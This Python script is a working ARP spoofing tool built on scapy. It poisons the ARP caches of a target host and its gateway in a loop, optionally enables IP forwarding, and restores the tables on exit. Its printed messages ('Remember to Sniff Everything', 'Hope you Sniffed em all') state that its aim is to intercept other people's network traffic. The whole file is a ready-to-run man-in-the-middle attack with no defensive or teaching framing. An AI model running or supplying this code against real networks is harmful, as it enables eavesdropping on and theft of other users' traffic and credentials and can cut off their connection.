#echo 1 > /proc/sys/net/ipv4/ip_forward

import scapy.all as scapy
import time
import argparse
import sys
from termcolor import colored
import os

def enable_ipforward(ip_forward):
    if ip_forward == "True":
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print(colored("\r[+] IP Forwarding is Enabled. Remember to Sniff Everything on your current Interface :)", "green"))
    elif ip_forward == "False":
        print(colored("[-] IP Forwarding is not Enabled. The Target will have no Internet Connection.", "yellow"))
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_arguements():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target", dest="target_ip", help="Press -h to display Help.")
    parser.add_argument("-g","--gateway", dest="spoof_ip", help="Press -h to display Help.")
    parser.add_argument("-f","--forward", dest="ip_forward", help="Press -h to display Help")
    options = parser.parse_args()
    return options

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = arp_broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # To get only the answered machines list.
        return answered_list[0][1].hwsrc
    except IndexError:
        print(colored("[-] No Arguements Specified. Press -h for help.", "yellow"))
        sys.exit()

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # pdst stands for Packet Destination and vice versa.
    scapy.send(packet, verbose=False)

def restore(target_ip, source_ip): # The source IP is the Mac Address of the Router.
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc = source_mac)
    scapy.send(packet, count=4, verbose=False)


def launch_attack(target_ip, spoof_ip, ip_forward):
    enable_ipforward(ip_forward)
    try:
        counter = 0
        while True:
            spoof(target_ip , spoof_ip)
            spoof(spoof_ip, target_ip)
            print("\r[+] Sent " + str(counter) + " Packets", end="")
            counter += 2
            time.sleep(2)
    except KeyboardInterrupt:
        print(colored("\n[-] Ctrl+C detected, Quitting..", "yellow"))
        restore(target_ip, spoof_ip)
        restore(spoof_ip, target_ip)
        print(colored("[+] Restored the ARP tables of Target and Host.", "green"))
        print(colored("[*] Hope you Sniffed em all.", "green"))

options = get_arguements()
ip_forward = options.ip_forward
target_ip = options.target_ip
spoof_ip  = options.spoof_ip
launch_attack(target_ip, spoof_ip, ip_forward)